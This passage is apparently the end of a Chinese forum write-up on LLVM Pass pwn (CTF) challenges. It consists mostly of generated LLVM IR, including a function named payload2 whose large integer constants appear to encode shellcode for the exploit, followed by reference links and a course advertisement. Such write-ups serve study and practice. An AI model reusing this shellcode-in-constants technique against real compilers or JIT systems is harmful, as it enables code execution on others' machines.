    %24 = add nsw i64 %23, 1024
    %25 = add nsw i64 %24, 1024
    %26 = add nsw i64 %25, 1024
    %27 = add nsw i64 %26, 1024
    %28 = add nsw i64 %27, 1024
    %29 = add nsw i64 %28, 1024
    %30 = add nsw i64 %29, 1024
    %31 = add nsw i64 %30, 1024
    %32 = add nsw i64 %31, 1024
    %33 = add nsw i64 %32, 1024
    %34 = add nsw i64 %33, 1024
    %35 = add nsw i64 %34, 1024
    %36 = add nsw i64 %35, 1024
    %37 = add nsw i64 %36, 1024
    %38 = add nsw i64 %37, 1024
    %39 = add nsw i64 %38, 1024
    %40 = add nsw i64 %39, 1024
    %41 = add nsw i64 %40, 1024
    %42 = add nsw i64 %41, 1024
    %43 = add nsw i64 %42, 1024
    %44 = add nsw i64 %43, 1024
    %45 = add nsw i64 %44, 1024
    %46 = add nsw i64 %45, 1024
    %47 = add nsw i64 %46, 1024
    %48 = add nsw i64 %47, 1024
    %49 = add nsw i64 %48, 1024
    %50 = add nsw i64 %49, 1024
    %51 = add nsw i64 %50, 1024
    %52 = add nsw i64 %51, 1024
    %53 = add nsw i64 %52, 1024
    %54 = add nsw i64 %53, 1024
    %55 = add nsw i64 %54, 1024
    %56 = add nsw i64 %55, 1024
    %57 = add nsw i64 %56, 1024
    %58 = add nsw i64 %57, 1024
    %59 = add nsw i64 %58, 1024
    %60 = add nsw i64 %59, 1024
    %61 = add nsw i64 %60, 1024
    %62 = add nsw i64 %61, 1024
    %63 = add nsw i64 %62, 1024
    %64 = add nsw i64 %63, 1024
    %65 = add nsw i64 %64, 1024
    %66 = add nsw i64 %65, 1024
    %67 = add nsw i64 %66, 1024
    %68 = add nsw i64 %67, 1024
    %69 = add nsw i64 %68, 1024
    %70 = add nsw i64 %69, 1024
    %71 = add nsw i64 %70, 1024
    %72 = add nsw i64 %71, 1024
    %73 = add nsw i64 %72, 1024
    %74 = add nsw i64 %73, 1024
    %75 = add nsw i64 %74, 1024
    %76 = add nsw i64 %75, 1024
    %77 = add nsw i64 %76, 1024
    %78 = add nsw i64 %77, 1024
    %79 = add nsw i64 %78, 1024
    %80 = add nsw i64 %79, 1024
    %81 = add nsw i64 %80, 1024
    %82 = add nsw i64 %81, 1024
    %83 = add nsw i64 %82, 1024
    %84 = add nsw i64 %83, 1024
    %85 = add nsw i64 %84, 1024
    %86 = add nsw i64 %85, 1024
    %87 = add nsw i64 %86, 1024
    %88 = add nsw i64 %87, 1024
    %89 = add nsw i64 %88, 1024
    %90 = add nsw i64 %89, 1024
    %91 = add nsw i64 %90, 1024
    %92 = add nsw i64 %91, 1024
    %93 = add nsw i64 %92, 1024
    %94 = add nsw i64 %93, 1024
    %95 = add nsw i64 %94, 1024
    %96 = add nsw i64 %95, 1024
    %97 = add nsw i64 %96, 1024
    %98 = add nsw i64 %97, 1024
    %99 = add nsw i64 %98, 1024
    %100 = add nsw i64 %99, 1024
    %101 = add nsw i64 %100, 1024
    %102 = add nsw i64 %101, 1024
    %103 = add nsw i64 %102, 1024
    %104 = add nsw i64 %103, 1024
    %105 = add nsw i64 %104, 1024
    %106 = add nsw i64 %105, 1024
    %107 = add nsw i64 %106, 1024
    %108 = add nsw i64 %107, 1024
    %109 = add nsw i64 %108, 1024
    %110 = add nsw i64 %109, 1024
    %111 = add nsw i64 %110, 1024
    %112 = add nsw i64 %111, 1024
    %113 = add nsw i64 %112, 1024
    %114 = add nsw i64 %113, 1024
    %115 = add nsw i64 %114, 1024
    %116 = add nsw i64 %115, 1024
    %117 = add nsw i64 %116, 1024
    %118 = add nsw i64 %117, 1024
    %119 = add nsw i64 %118, 1024
    %120 = add nsw i64 %119, 1024
    %121 = add nsw i64 %120, 1024
    %122 = add nsw i64 %121, 1024
    %123 = add nsw i64 %122, 1024
    %124 = add nsw i64 %123, 1024
    %125 = add nsw i64 %124, 1024
    %126 = add nsw i64 %125, 1024
    %127 = add nsw i64 %126, 1024
    %128 = add nsw i64 %127, 1024
    %129 = add nsw i64 %128, 1024
    %130 = add nsw i64 %129, 1024
    %131 = add nsw i64 %130, 1024
    %132 = add nsw i64 %131, 1024
    %133 = add nsw i64 %132, 1024
    %134 = add nsw i64 %133, 1024
    %135 = add nsw i64 %134, 1024
    %136 = add nsw i64 %135, 1024
    %137 = add nsw i64 %136, 1024
    %138 = add nsw i64 %137, 1024
    %139 = add nsw i64 %138, 1024
    %140 = add nsw i64 %139, 1024
    %141 = add nsw i64 %140, 1024
    %142 = add nsw i64 %141, 1024
    %143 = add nsw i64 %142, 1024
    %144 = add nsw i64 %143, 1024
    %145 = add nsw i64 %144, 1024
    %146 = add nsw i64 %145, 1024
    %147 = add nsw i64 %146, 1024
    %148 = add nsw i64 %147, 1024
    %149 = add nsw i64 %148, 1024
    %150 = add nsw i64 %149, 1024
    %151 = add nsw i64 %150, 1024
    %152 = add nsw i64 %151, 1024
    %153 = add nsw i64 %152, 1024
    %154 = add nsw i64 %153, 1024
    %155 = add nsw i64 %154, 1024
    %156 = add nsw i64 %155, 1024
    %157 = add nsw i64 %156, 1024
    %158 = add nsw i64 %157, 1024
    %159 = add nsw i64 %158, 1024
    %160 = add nsw i64 %159, 1024
    %161 = add nsw i64 %160, 1024
    %162 = add nsw i64 %161, 1024
    %163 = add nsw i64 %162, 1024
    %164 = add nsw i64 %163, 1024
    %165 = add nsw i64 %164, 1024
    %166 = add nsw i64 %165, 1024
    %167 = add nsw i64 %166, 1024
    %168 = add nsw i64 %167, 1024
    %169 = add nsw i64 %168, 1024
    %170 = add nsw i64 %169, 1024
    %171 = add nsw i64 %170, 1024
    %172 = add nsw i64 %171, 1024
    %173 = add nsw i64 %172, 1024
    %174 = add nsw i64 %173, 1024
    %175 = add nsw i64 %174, 1024
    %176 = add nsw i64 %175, 1024
    %177 = add nsw i64 %176, 1024
    %178 = add nsw i64 %177, 1024
    %179 = add nsw i64 %178, 1024
    %180 = add nsw i64 %179, 1024
    %181 = add nsw i64 %180, 1024
    %182 = add nsw i64 %181, 1024
    %183 = add nsw i64 %182, 1024
    %184 = add nsw i64 %183, 1024
    %185 = add nsw i64 %184, 1024
    %186 = add nsw i64 %185, 1024
    %187 = add nsw i64 %186, 1024
    %188 = add nsw i64 %187, 1024
    %189 = add nsw i64 %188, 1024
    %190 = add nsw i64 %189, 1024
    %191 = add nsw i64 %190, 1024
    %192 = add nsw i64 %191, 1024
    %193 = add nsw i64 %192, 1024
    %194 = add nsw i64 %193, 1024
    %195 = add nsw i64 %194, 1024
    %196 = add nsw i64 %195, 1024
    %197 = add nsw i64 %196, 1024
    %198 = add nsw i64 %197, 1024
    %199 = add nsw i64 %198, 1024
    %200 = add nsw i64 %199, 1024
    %201 = add nsw i64 %200, 1024
    %202 = add nsw i64 %201, 1024
    %203 = add nsw i64 %202, 1024
    %204 = add nsw i64 %203, 1024
    %205 = add nsw i64 %204, 1024
    %206 = add nsw i64 %205, 1024
    %207 = add nsw i64 %206, 1024
    %208 = add nsw i64 %207, 1024
    %209 = add nsw i64 %208, 1024
    %210 = add nsw i64 %209, 1024
    %211 = add nsw i64 %210, 1024
    %212 = add nsw i64 %211, 1024
    %213 = add nsw i64 %212, 1024
    %214 = add nsw i64 %213, 1024
    %215 = add nsw i64 %214, 1024
    %216 = add nsw i64 %215, 1024
    %217 = add nsw i64 %216, 1024
    %218 = add nsw i64 %217, 1024
    %219 = add nsw i64 %218, 1024
    %220 = add nsw i64 %219, 1024
    %221 = add nsw i64 %220, 1024
    %222 = add nsw i64 %221, 1024
    %223 = add nsw i64 %222, 1024
    %224 = add nsw i64 %223, 1024
    %225 = add nsw i64 %224, 1024
    %226 = add nsw i64 %225, 1024
    %227 = add nsw i64 %226, 1024
    %228 = add nsw i64 %227, 1024
    %229 = add nsw i64 %228, 1024
    %230 = add nsw i64 %229, 1024
    %231 = add nsw i64 %230, 1024
    %232 = add nsw i64 %231, 1024
    %233 = add nsw i64 %232, 1024
    %234 = add nsw i64 %233, 1024
    %235 = add nsw i64 %234, 1024
    %236 = add nsw i64 %235, 1024
    %237 = add nsw i64 %236, 1024
    %238 = add nsw i64 %237, 1024
    %239 = add nsw i64 %238, 1024
    %240 = add nsw i64 %239, 1024
    %241 = add nsw i64 %240, 1024
    %242 = add nsw i64 %241, 1024
    %243 = add nsw i64 %242, 1024
    %244 = add nsw i64 %243, 1024
    %245 = add nsw i64 %244, 1024
    %246 = add nsw i64 %245, 1024
    %247 = add nsw i64 %246, 1024
    %248 = add nsw i64 %247, 1024
    %249 = add nsw i64 %248, 1024
    %250 = add nsw i64 %249, 1024
    %251 = add nsw i64 %250, 1024
    %252 = add nsw i64 %251, 1024
    %253 = add nsw i64 %252, 1024
    %254 = add nsw i64 %253, 1024
    %255 = add nsw i64 %254, 1024
    %256 = add nsw i64 %255, 1024
    %257 = add nsw i64 %256, 1024
    %258 = add nsw i64 %257, 1024
    %259 = add nsw i64 %258, 1024
    %260 = add nsw i64 %259, 1024
    %261 = add nsw i64 %260, 1024
    %262 = add nsw i64 %261, 1024
    %263 = add nsw i64 %262, 1024
    %264 = add nsw i64 %263, 1024
    %265 = add nsw i64 %264, 1024
    %266 = add nsw i64 %265, 1024
    %267 = add nsw i64 %266, 1024
    %268 = add nsw i64 %267, 1024
    %269 = add nsw i64 %268, 1024
    %270 = add nsw i64 %269, 1024
    %271 = add nsw i64 %270, 1024
    %272 = add nsw i64 %271, 1024
    %273 = add nsw i64 %272, 1024
    %274 = add nsw i64 %273, 1024
    %275 = add nsw i64 %274, 1024
    %276 = add nsw i64 %275, 1024
    %277 = add nsw i64 %276, 1024
    %278 = add nsw i64 %277, 1024
    %279 = add nsw i64 %278, 1024
    %280 = add nsw i64 %279, 1024
    %281 = add nsw i64 %280, 1024
    %282 = add nsw i64 %281, 1024
    %283 = add nsw i64 %282, 1024
    %284 = add nsw i64 %283, 1024
    %285 = add nsw i64 %284, 1024
    %286 = add nsw i64 %285, 1024
    %287 = add nsw i64 %286, 1024
    %288 = add nsw i64 %287, 1024
    %289 = add nsw i64 %288, 1024
    %290 = add nsw i64 %289, 1024
    %291 = add nsw i64 %290, 1024
    %292 = add nsw i64 %291, 1024
    %293 = add nsw i64 %292, 1024
    %294 = add nsw i64 %293, 1024
    %295 = add nsw i64 %294, 1024
    %296 = add nsw i64 %295, 1024
    %297 = add nsw i64 %296, 1024
    %298 = add nsw i64 %297, 1024
    %299 = add nsw i64 %298, 1024
    %300 = add nsw i64 %299, 1024
    %301 = add nsw i64 %300, 1024
    %302 = add nsw i64 %301, 1024
    %303 = add nsw i64 %302, 1024
    %304 = add nsw i64 %303, 1024
    %305 = add nsw i64 %304, 1024
    %306 = add nsw i64 %305, 1024
    %307 = add nsw i64 %306, 1024
    %308 = add nsw i64 %307, 1024
    %309 = add nsw i64 %308, 1024
    %310 = add nsw i64 %309, 1024
    %311 = add nsw i64 %310, 1024
    %312 = add nsw i64 %311, 1024
    %313 = add nsw i64 %312, 1024
    %314 = add nsw i64 %313, 1024
    %315 = add nsw i64 %314, 1024
 
    ret i64 %315
}
 
; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @payload2(i64 %0) #0 {
    %2 = add nsw i64 %0, 1
    %3 = add nsw i64 %2, 1
    %4 = add nsw i64 %3, 1
    %5 = add nsw i64 %4, 1
    %6 = add nsw i64 %5, 1
    %7 = add nsw i64 %6, 16999839996723556031
    %8 = add nsw i64 %7, 16999840167007600968
    %9 = add nsw i64 %8, 16999839549882511291
    %10 = add nsw i64 %9, 16999840169020293448
    %11 = add nsw i64 %10, 16999840169015152727
    %12 = add nsw i64 %11, 16999840169015152724
    %13 = add nsw i64 %12, 16999840169015152735
    %14 = add nsw i64 %13, 16999840169021813064
    %15 = add nsw i64 %14, 16999840169019453768
    %16 = add nsw i64 %15, 16999840169015130986
    %17 = add nsw i64 %16, 16999840169015152728
    %18 = add nsw i64 %17, 16999840169015117071
    %19 = add nsw i64 %18, 1024
    %20 = add nsw i64 %19, 1024
    %21 = add nsw i64 %20, 1024
    %22 = add nsw i64 %21, 1024
    %23 = add nsw i64 %22, 1024
    %24 = add nsw i64 %23, 1024
    %25 = add nsw i64 %24, 1024
    %26 = add nsw i64 %25, 1024
    %27 = add nsw i64 %26, 1024
    %28 = add nsw i64 %27, 1024
    %29 = add nsw i64 %28, 1024
    %30 = add nsw i64 %29, 1024
    %31 = add nsw i64 %30, 1024
    %32 = add nsw i64 %31, 1024
    %33 = add nsw i64 %32, 1024
    %34 = add nsw i64 %33, 1024
    %35 = add nsw i64 %34, 1024
    %36 = add nsw i64 %35, 1024
    %37 = add nsw i64 %36, 1024
    %38 = add nsw i64 %37, 1024
    %39 = add nsw i64 %38, 1024
    %40 = add nsw i64 %39, 1024
    %41 = add nsw i64 %40, 1024
    %42 = add nsw i64 %41, 1024
    %43 = add nsw i64 %42, 1024
    %44 = add nsw i64 %43, 1024
    %45 = add nsw i64 %44, 1024
    %46 = add nsw i64 %45, 1024
    %47 = add nsw i64 %46, 1024
    %48 = add nsw i64 %47, 1024
    %49 = add nsw i64 %48, 1024
    %50 = add nsw i64 %49, 1024
    %51 = add nsw i64 %50, 1024
    %52 = add nsw i64 %51, 1024
    %53 = add nsw i64 %52, 1024
    %54 = add nsw i64 %53, 1024
    %55 = add nsw i64 %54, 1024
    %56 = add nsw i64 %55, 1024
    %57 = add nsw i64 %56, 1024
    %58 = add nsw i64 %57, 1024
    %59 = add nsw i64 %58, 1024
    %60 = add nsw i64 %59, 1024
    %61 = add nsw i64 %60, 1024
    %62 = add nsw i64 %61, 1024
    %63 = add nsw i64 %62, 1024
    %64 = add nsw i64 %63, 1024
    %65 = add nsw i64 %64, 1024
    %66 = add nsw i64 %65, 1024
    %67 = add nsw i64 %66, 1024
    %68 = add nsw i64 %67, 1024
    %69 = add nsw i64 %68, 1024
    %70 = add nsw i64 %69, 1024
    %71 = add nsw i64 %70, 1024
    %72 = add nsw i64 %71, 1024
    %73 = add nsw i64 %72, 1024
    %74 = add nsw i64 %73, 1024
    %75 = add nsw i64 %74, 1024
    %76 = add nsw i64 %75, 1024
    %77 = add nsw i64 %76, 1024
    %78 = add nsw i64 %77, 1024
    %79 = add nsw i64 %78, 1024
    %80 = add nsw i64 %79, 1024
    %81 = add nsw i64 %80, 1024
    %82 = add nsw i64 %81, 1024
    %83 = add nsw i64 %82, 1024
    %84 = add nsw i64 %83, 1024
    %85 = add nsw i64 %84, 1024
    %86 = add nsw i64 %85, 1024
    %87 = add nsw i64 %86, 1024
    %88 = add nsw i64 %87, 1024
    %89 = add nsw i64 %88, 1024
    %90 = add nsw i64 %89, 1024
    %91 = add nsw i64 %90, 1024
    %92 = add nsw i64 %91, 1024
    %93 = add nsw i64 %92, 1024
    %94 = add nsw i64 %93, 1024
    %95 = add nsw i64 %94, 1024
    %96 = add nsw i64 %95, 1024
    %97 = add nsw i64 %96, 1024
    %98 = add nsw i64 %97, 1024
    %99 = add nsw i64 %98, 1024
    %100 = add nsw i64 %99, 1024
    %101 = add nsw i64 %100, 1024
    %102 = add nsw i64 %101, 1024
    %103 = add nsw i64 %102, 1024
    %104 = add nsw i64 %103, 1024
    %105 = add nsw i64 %104, 1024
    %106 = add nsw i64 %105, 1024
    %107 = add nsw i64 %106, 1024
    %108 = add nsw i64 %107, 1024
    %109 = add nsw i64 %108, 1024
    %110 = add nsw i64 %109, 1024
    %111 = add nsw i64 %110, 1024
    %112 = add nsw i64 %111, 1024
    %113 = add nsw i64 %112, 1024
    %114 = add nsw i64 %113, 1024
    %115 = add nsw i64 %114, 1024
    %116 = add nsw i64 %115, 1024
    %117 = add nsw i64 %116, 1024
    %118 = add nsw i64 %117, 1024
    %119 = add nsw i64 %118, 1024
    %120 = add nsw i64 %119, 1024
    %121 = add nsw i64 %120, 1024
    %122 = add nsw i64 %121, 1024
    %123 = add nsw i64 %122, 1024
    %124 = add nsw i64 %123, 1024
    %125 = add nsw i64 %124, 1024
    %126 = add nsw i64 %125, 1024
    %127 = add nsw i64 %126, 1024
    %128 = add nsw i64 %127, 1024
    %129 = add nsw i64 %128, 1024
    %130 = add nsw i64 %129, 1024
    %131 = add nsw i64 %130, 1024
    %132 = add nsw i64 %131, 1024
    %133 = add nsw i64 %132, 1024
    %134 = add nsw i64 %133, 1024
    %135 = add nsw i64 %134, 1024
    %136 = add nsw i64 %135, 1024
    %137 = add nsw i64 %136, 1024
    %138 = add nsw i64 %137, 1024
    %139 = add nsw i64 %138, 1024
    %140 = add nsw i64 %139, 1024
    %141 = add nsw i64 %140, 1024
    %142 = add nsw i64 %141, 1024
    %143 = add nsw i64 %142, 1024
    %144 = add nsw i64 %143, 1024
    %145 = add nsw i64 %144, 1024
    %146 = add nsw i64 %145, 1024
    %147 = add nsw i64 %146, 1024
    %148 = add nsw i64 %147, 1024
    %149 = add nsw i64 %148, 1024
    %150 = add nsw i64 %149, 1024
    %151 = add nsw i64 %150, 1024
    %152 = add nsw i64 %151, 1024
    %153 = add nsw i64 %152, 1024
    %154 = add nsw i64 %153, 1024
    %155 = add nsw i64 %154, 1024
    %156 = add nsw i64 %155, 1024
    %157 = add nsw i64 %156, 1024
    %158 = add nsw i64 %157, 1024
    %159 = add nsw i64 %158, 1024
    %160 = add nsw i64 %159, 1024
    %161 = add nsw i64 %160, 1024
    %162 = add nsw i64 %161, 1024
    %163 = add nsw i64 %162, 1024
    %164 = add nsw i64 %163, 1024
    %165 = add nsw i64 %164, 1024
    %166 = add nsw i64 %165, 1024
    %167 = add nsw i64 %166, 1024
    %168 = add nsw i64 %167, 1024
    %169 = add nsw i64 %168, 1024
    %170 = add nsw i64 %169, 1024
    %171 = add nsw i64 %170, 1024
    %172 = add nsw i64 %171, 1024
    %173 = add nsw i64 %172, 1024
    %174 = add nsw i64 %173, 1024
    %175 = add nsw i64 %174, 1024
    %176 = add nsw i64 %175, 1024
    %177 = add nsw i64 %176, 1024
    %178 = add nsw i64 %177, 1024
    %179 = add nsw i64 %178, 1024
    %180 = add nsw i64 %179, 1024
    %181 = add nsw i64 %180, 1024
    %182 = add nsw i64 %181, 1024
    %183 = add nsw i64 %182, 1024
    %184 = add nsw i64 %183, 1024
    %185 = add nsw i64 %184, 1024
    %186 = add nsw i64 %185, 1024
    %187 = add nsw i64 %186, 1024
    %188 = add nsw i64 %187, 1024
    %189 = add nsw i64 %188, 1024
    %190 = add nsw i64 %189, 1024
    %191 = add nsw i64 %190, 1024
    %192 = add nsw i64 %191, 1024
    %193 = add nsw i64 %192, 1024
    %194 = add nsw i64 %193, 1024
    %195 = add nsw i64 %194, 1024
    %196 = add nsw i64 %195, 1024
    %197 = add nsw i64 %196, 1024
    %198 = add nsw i64 %197, 1024
    %199 = add nsw i64 %198, 1024
    %200 = add nsw i64 %199, 1024
    %201 = add nsw i64 %200, 1024
    %202 = add nsw i64 %201, 1024
    %203 = add nsw i64 %202, 1024
    %204 = add nsw i64 %203, 1024
    %205 = add nsw i64 %204, 1024
    %206 = add nsw i64 %205, 1024
    %207 = add nsw i64 %206, 1024
    %208 = add nsw i64 %207, 1024
    %209 = add nsw i64 %208, 1024
    %210 = add nsw i64 %209, 1024
    %211 = add nsw i64 %210, 1024
    %212 = add nsw i64 %211, 1024
    %213 = add nsw i64 %212, 1024
    %214 = add nsw i64 %213, 1024
    %215 = add nsw i64 %214, 1024
    %216 = add nsw i64 %215, 1024
    %217 = add nsw i64 %216, 1024
    %218 = add nsw i64 %217, 1024
    %219 = add nsw i64 %218, 1024
    %220 = add nsw i64 %219, 1024
    %221 = add nsw i64 %220, 1024
    %222 = add nsw i64 %221, 1024
    %223 = add nsw i64 %222, 1024
    %224 = add nsw i64 %223, 1024
    %225 = add nsw i64 %224, 1024
    %226 = add nsw i64 %225, 1024
    %227 = add nsw i64 %226, 1024
    %228 = add nsw i64 %227, 1024
    %229 = add nsw i64 %228, 1024
    %230 = add nsw i64 %229, 1024
    %231 = add nsw i64 %230, 1024
    %232 = add nsw i64 %231, 1024
    %233 = add nsw i64 %232, 1024
    %234 = add nsw i64 %233, 1024
    %235 = add nsw i64 %234, 1024
    %236 = add nsw i64 %235, 1024
    %237 = add nsw i64 %236, 1024
    %238 = add nsw i64 %237, 1024
    %239 = add nsw i64 %238, 1024
    %240 = add nsw i64 %239, 1024
    %241 = add nsw i64 %240, 1024
    %242 = add nsw i64 %241, 1024
    %243 = add nsw i64 %242, 1024
    %244 = add nsw i64 %243, 1024
    %245 = add nsw i64 %244, 1024
    %246 = add nsw i64 %245, 1024
    %247 = add nsw i64 %246, 1024
    %248 = add nsw i64 %247, 1024
    %249 = add nsw i64 %248, 1024
    %250 = add nsw i64 %249, 1024
    %251 = add nsw i64 %250, 1024
    %252 = add nsw i64 %251, 1024
    %253 = add nsw i64 %252, 1024
    %254 = add nsw i64 %253, 1024
    %255 = add nsw i64 %254, 1024
    %256 = add nsw i64 %255, 1024
    %257 = add nsw i64 %256, 1024
    %258 = add nsw i64 %257, 1024
    %259 = add nsw i64 %258, 1024
    %260 = add nsw i64 %259, 1024
    %261 = add nsw i64 %260, 1024
    %262 = add nsw i64 %261, 1024
    %263 = add nsw i64 %262, 1024
    %264 = add nsw i64 %263, 1024
    %265 = add nsw i64 %264, 1024
    %266 = add nsw i64 %265, 1024
    %267 = add nsw i64 %266, 1024
    %268 = add nsw i64 %267, 1024
    %269 = add nsw i64 %268, 1024
    %270 = add nsw i64 %269, 1024
    %271 = add nsw i64 %270, 1024
    %272 = add nsw i64 %271, 1024
    %273 = add nsw i64 %272, 1024
    %274 = add nsw i64 %273, 1024
    %275 = add nsw i64 %274, 1024
    %276 = add nsw i64 %275, 1024
    %277 = add nsw i64 %276, 1024
    %278 = add nsw i64 %277, 1024
    %279 = add nsw i64 %278, 1024
    %280 = add nsw i64 %279, 1024
    %281 = add nsw i64 %280, 1024
    %282 = add nsw i64 %281, 1024
    %283 = add nsw i64 %282, 1024
    %284 = add nsw i64 %283, 1024
    %285 = add nsw i64 %284, 1024
    %286 = add nsw i64 %285, 1024
    %287 = add nsw i64 %286, 1024
    %288 = add nsw i64 %287, 1024
    %289 = add nsw i64 %288, 1024
    %290 = add nsw i64 %289, 1024
    %291 = add nsw i64 %290, 1024
    %292 = add nsw i64 %291, 1024
    %293 = add nsw i64 %292, 1024
    %294 = add nsw i64 %293, 1024
    %295 = add nsw i64 %294, 1024
    %296 = add nsw i64 %295, 1024
    %297 = add nsw i64 %296, 1024
    %298 = add nsw i64 %297, 1024
    %299 = add nsw i64 %298, 1024
    %300 = add nsw i64 %299, 1024
    %301 = add nsw i64 %300, 1024
    %302 = add nsw i64 %301, 1024
    %303 = add nsw i64 %302, 1024
    %304 = add nsw i64 %303, 1024
    %305 = add nsw i64 %304, 1024
    %306 = add nsw i64 %305, 1024
    %307 = add nsw i64 %306, 1024
    %308 = add nsw i64 %307, 1024
    %309 = add nsw i64 %308, 1024
    %310 = add nsw i64 %309, 1024
    %311 = add nsw i64 %310, 1024
    %312 = add nsw i64 %311, 1024
    %313 = add nsw i64 %312, 1024
    %314 = add nsw i64 %313, 1024
    %315 = add nsw i64 %314, 1024
    %316 = add nsw i64 %315, 1024
    %317 = add nsw i64 %316, 1024
    %318 = add nsw i64 %317, 1024
 
    ret i64 %318
}
 
attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
 
!llvm.module.flags = !{!0}
!llvm.ident = !{!1}
 
!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 8.0.1-9 (tags/RELEASE_801/final)"}

```

参考文章
----

winmt 师傅：[https://bbs.kanxue.com/thread-274259.htm](https://bbs.kanxue.com/thread-274259.htm)

Ayakaaa 师傅：[https://bbs.kanxue.com/thread-273119.htm](https://bbs.kanxue.com/thread-273119.htm)

[[培训]《安卓高级研修班 (网课)》月薪三万计划，掌握调试、分析还原 ollvm、vmp 的方法，定制 art 虚拟机自动化脱壳的方法](https://www.kanxue.com/book-section_list-84.htm)

最后于 2 小时前 被 Real 返璞归真编辑 ，原因：

上传的附件：

*   [LLVM.zip](javascript:void(0)) （5.97MB，1 次下载）